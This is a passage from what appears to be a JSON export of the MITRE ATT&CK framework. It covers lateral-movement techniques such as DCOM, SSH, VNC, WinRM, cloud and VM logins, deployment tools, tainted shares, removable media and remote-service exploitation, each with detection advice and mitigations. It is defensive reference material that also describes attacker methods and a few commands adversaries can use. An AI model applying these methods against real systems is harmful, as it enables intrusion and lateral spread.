Microsoft COM)</a>\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Wide Com Keys)</a> By default, only Administrators may remotely activate and launch COM objects through DCOM. <a href=\"https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM ACL)</a>\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications <a href=\"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)</a> as well as other Windows objects that contain insecure methods. <a href=\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma MMC20 COM Jan 2017)</a> <a href=\"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma DCOM Lateral Movement Jan 2017)</a> DCOM can also execute macros in existing documents <a href=\"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Excel DCOM Sept 2017)</a> and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application <a href=\"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017)</a>, bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with Windows Management Instrumentation. <a href=\"https://msdn.microsoft.com/en-us/library/aa394582.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN WMI)</a>","detection":"Monitor for COM objects loading DLLs and other modules not typically associated with the application. <a href=\"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)</a> Enumeration of COM objects, via Query Registry or PowerShell, may also proceed malicious use. <a href=\"https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fireeye Hunting COM June 2019)</a> <a href=\"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Enigma MMC20 COM Jan 2017)</a> Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135).","platforms":["Windows"],"dataSources":["Network Traffic: Network Connection Creation","Module: Module Load","Process: Process Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{{AppID_GUID}}</code> associated with the process-wide security of individual COM applications. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Process Wide Com Keys)</a>\n\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole</code> associated with system-wide security defaults for all COM applications that do not set their own process-wide security. <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft System Wide Com Keys)</a> <a href=\"https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COM ACL)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Enable Windows firewall, which prevents DCOM instantiation by default."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling DCOM through Dcomcnfg.exe. <a href=\"https://technet.microsoft.com/library/cc771387.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable DCOM)</a>"},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Ensure all COM alerts and Protected View are enabled. <a href=\"https://support.office.com/en-us/article/What-is-Protected-View-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Protected View)</a>"}]},{"id":"T1021.004","name":"SSH","description":"Adversaries may use Valid Accounts to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via <code>vim-cmd hostsvc/enable_ssh</code>) or via vCenter. <a href=\"https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia ESXi Ransomware 2025)</a> <a href=\"https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro ESXI Ransomware)</a> <a href=\"https://www.sygnia.co/blog/abyss-locker-ransomware-attack-analysis/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Abyss Locker 2025)</a> The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., SSH Authorized Keys).","detection":"Use of SSH may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nOn macOS systems <code>log show --predicate 'process = \"sshd\"'</code> can be used to review incoming SSH connection attempts for suspicious activity. The command <code>log show --info --predicate 'process = \"ssh\" or eventMessage contains \"ssh\"'</code> can be used to review outgoing SSH connection activity. <a href=\"https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)</a>\n\nOn Linux systems SSH activity can be found in the logs located in <code>/var/log/auth.log</code> or <code>/var/log/secure</code> depending on the distro you are using.","platforms":["ESXi","Linux","macOS"],"dataSources":["Logon Session: Logon Session Creation","Process: Process Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit which user accounts are allowed to login via SSH."},{"id":"M1032","name":"Multi-factor Authentication","description":"Require multi-factor authentication for SSH connections wherever possible, such as password protected SSH keys."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable the SSH daemon on systems that do not require it, especially ESXi servers. For macOS, ensure Remote Login is disabled under Sharing Preferences. <a href=\"https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)</a>"}]},{"id":"T1021.005","name":"VNC","description":"Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network. <a href=\"https://datatracker.ietf.org/doc/html/rfc6143#section-7.2.2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: The Remote Framebuffer Protocol)</a>\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC. <a href=\"https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MacOS VNC software for Remote Desktop)</a> <a href=\"https://help.realvnc.com/hc/en-us/articles/360002250097-Setting-up-System-Authentication\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VNC Authentication)</a>\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation. <a href=\"https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hijacking VNC)</a> <a href=\"https://www.tenable.com/blog/detecting-macos-high-sierra-root-account-without-authentication\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: macOS root VNC login without authentication)</a> <a href=\"https://www.bleepingcomputer.com/news/security/dozens-of-vnc-vulnerabilities-found-in-linux-windows-solutions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VNC Vulnerabilities)</a> <a href=\"https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Offensive Security VNC Authentication Check)</a> <a href=\"https://pentestlab.blog/2012/10/30/attacking-vnc-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Attacking VNC Servers PentestLab)</a> <a href=\"https://lists.openstack.org/pipermail/openstack/2013-December/004138.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Havana authentication bug)</a>","detection":"Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.\n\nOn macOS systems <code>log show --predicate 'process = \"screensharingd\" and eventMessage contains \"Authentication:\"'</code> can be used to review incoming VNC connection attempts for suspicious activity. <a href=\"https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)</a>\n\nMonitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse. <a href=\"https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/blob/9aa9181e/src/grd-settings.c#L207\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gnome Remote Desktop grd-settings)</a> <a href=\"https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/blob/9aa9181e/src/org.gnome.desktop.remote-desktop.gschema.xml.in\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gnome Remote Desktop gschema)</a>","platforms":["Linux","Windows","macOS"],"dataSources":["Process: Process Creation","Logon Session: Logon Session Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to user groups that require it. A VNC server must be manually installed by the user or adversary."},{"id":"M1037","name":"Filter Network Traffic","description":"VNC defaults to TCP ports 5900 for the server, 5800 for browser access, and 5500 for a viewer in listening mode. Filtering or blocking these ports will inhibit VNC traffic utilizing default ports."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Uninstall any VNC server software where not required."},{"id":"M1047","name":"Audit","description":"Inventory workstations for unauthorized VNC server software."}]},{"id":"T1021.006","name":"Windows Remote Management","description":"Adversaries may use Valid Accounts to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). <a href=\"https://learn.microsoft.com/en-us/windows/win32/winrm/portal\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WinRM)</a> It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. <a href=\"https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Jacobsen 2014)</a> WinRM  can be used as a method of remotely interacting with Windows Management Instrumentation. <a href=\"https://msdn.microsoft.com/en-us/library/aa394582.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN WMI)</a>","detection":"Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.  Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events. <a href=\"https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting Lateral Movement)</a> Also monitor for remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS).","platforms":["Windows"],"dataSources":["Process: Process Creation","Logon Session: Logon Session Creation","Network Traffic: Network Connection Creation","Command: Command Execution","Network Traffic: Network Traffic Flow","Service: Service Metadata"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"If the service is necessary, lock down critical enclaves with separate WinRM accounts and permissions."},{"id":"M1030","name":"Network Segmentation","description":"If the service is necessary, lock down critical enclaves with separate WinRM infrastructure and follow WinRM best practices on use of host firewalls to restrict WinRM access to allow communication only to/from specific devices. <a href=\"https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA Spotting)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable the WinRM service."}]},{"id":"T1021.007","name":"Cloud Services","description":"Adversaries may log into accessible cloud services within a compromised environment using Valid Accounts that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., Cloud API), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via Application Access Token instead of a username and password.","detection":"","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of high-privileged domain and cloud accounts, and ensure that these are not used for day-to-day operations. Ensure that on-premises accounts do not have privileged cloud permissions and that isolated, cloud-only accounts are used for managing cloud environments. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/protect-m365-from-on-premises-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Protecting Microsoft 365 From On-Premises Attacks)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication on cloud services whenever possible."}]},{"id":"T1021.008","name":"Direct Cloud VM Connections","description":"Adversaries may leverage Valid Accounts to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the Cloud API, such as Azure Serial Console <a href=\"https://learn.microsoft.com/en-us/troubleshoot/azure/virtual-machines/serial-console-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Serial Console)</a>, AWS EC2 Instance Connect <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EC2 Instance Connect)</a> <a href=\"https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lucr-3: Getting SaaS-y in the cloud)</a>, and AWS System Manager. <a href=\"https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS System Manager)</a>.\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment. <a href=\"https://www.mandiant.com/resources/blog/sim-swapping-abuse-azure-serial\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)</a> These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., Cloud Administration Command).","detection":"","platforms":["IaaS"],"dataSources":["Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit which users are allowed to access compute infrastructure via cloud native methods."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"If direct virtual machine connections are not required for administrative use, disable these connection types where feasible."}]}]},{"id":"T1072","name":"Software Deployment Tools","description":"Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID. <a href=\"https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020)</a> Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure. <a href=\"https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)</a>\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries. <a href=\"https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)</a>\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.","detection":"Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.","platforms":["Linux","macOS","Network Devices","SaaS","Windows"],"dataSources":["Process: Process Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Ensure proper system and access isolation for critical network systems through use of group policy."},{"id":"M1017","name":"User Training","description":"Have a strict approval policy for use of deployment systems."},{"id":"M1018","name":"User Account Management","description":"Ensure that any accounts used by third-party providers to access these systems are traceable to the third-party and are not used throughout the network or used by other third-party providers in the same environment. Ensure there are regular reviews of accounts provisioned to these systems to verify continued business need, and ensure there is governance to trace de-provisioning of access that is no longer required. Ensure proper system and access isolation for critical network systems through use of account privilege separation."},{"id":"M1026","name":"Privileged Account Management","description":"Grant access to application deployment systems only to a limited number of authorized administrators."},{"id":"M1027","name":"Password Policies","description":"Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network."},{"id":"M1029","name":"Remote Data Storage","description":"If the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled."},{"id":"M1030","name":"Network Segmentation","description":"Ensure proper system isolation for critical network systems through use of firewalls."},{"id":"M1032","name":"Multi-factor Authentication","description":"Ensure proper system and access isolation for critical network systems through use of multi-factor authentication."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict the use of third-party software suites installed within an enterprise network."},{"id":"M1051","name":"Update Software","description":"Patch deployment systems regularly to prevent potential remote access through Exploitation for Privilege Escalation."}],"subTechniques":[]},{"id":"T1080","name":"Taint Shared Content","description":"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. <a href=\"https://rewtin.blogspot.ch/2017/11/abusing-user-shares-for-efficient.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Retwin Directory Share Pivot)</a>\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.","detection":"Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.","platforms":["Windows","SaaS","Linux","macOS","Office Suite"],"dataSources":["Network Share: Network Share Access","Process: Process Creation","File: File Modification","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Protect shared folders by minimizing users who have write access."},{"id":"M1038","name":"Execution Prevention","description":"Identify potentially malicious software that may be used to taint content or may result from it and audit and/or block the unknown programs by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically quarantine suspicious files. <a href=\"https://www.mandiant.com/resources/blog/cloud-bad-log-configurations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Cloudy Logs 2023)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Use utilities that detect or mitigate common features used in exploitation, such as the Microsoft Enhanced Mitigation Experience Toolkit (EMET)."}],"subTechniques":[]},{"id":"T1091","name":"Replication Through Removable Media","description":"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB. (Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. <a href=\"https://www.computerworld.com/article/2486903/windows-malware-tries-to-infect-android-devices-connected-to-pcs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Malware Infecting Android)</a> <a href=\"https://techcrunch.com/2019/08/12/iphone-charging-cable-hack-computer-def-con/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iPhone Charging Cable Hack)</a> For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).","detection":"Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.","platforms":["Windows"],"dataSources":["File: File Access","Process: Process Creation","Drive: Drive Creation","File: File Creation"],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Limit the use of USB devices and removable media within a network."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to block unsigned/untrusted executable files (such as .exe, .dll, or .scr) from running from USB removable drives. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Autorun if it is unnecessary. <a href=\"https://support.microsoft.com/en-us/kb/967715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable Autorun)</a> Disallow or restrict removable media at an organizational policy level if it is not required for business operations. <a href=\"https://technet.microsoft.com/en-us/library/cc772540(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Removable Media Control)</a>"}],"subTechniques":[]},{"id":"T1210","name":"Exploitation of Remote Services","description":"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB <a href=\"https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CIS Multiple SMB Vulnerabilities)</a> and RDP <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-0176\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVD CVE-2017-0176)</a> as well as applications that may be used within internal networks such as MySQL <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6662\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVD CVE-2016-6662)</a> and web server services. <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-7169\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVD CVE-2014-7169)</a> <a href=\"https://arstechnica.com/information-technology/2021/02/armed-with-exploits-hackers-on-the-prowl-for-a-critical-vmware-vulnerability/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica VMWare Code Execution Vulnerability 2021)</a> Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors. <a href=\"https://github.com/vmware/vcf-security-and-compliance-guidelines/blob/main/security-advisories/vmsa-2024-0019/README.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom VMSA-2024-0019)</a>\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.","detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":["Linux","Windows","macOS","ESXi"],"dataSources":["Network Traffic: Network Traffic Content","Application Log: Application Log 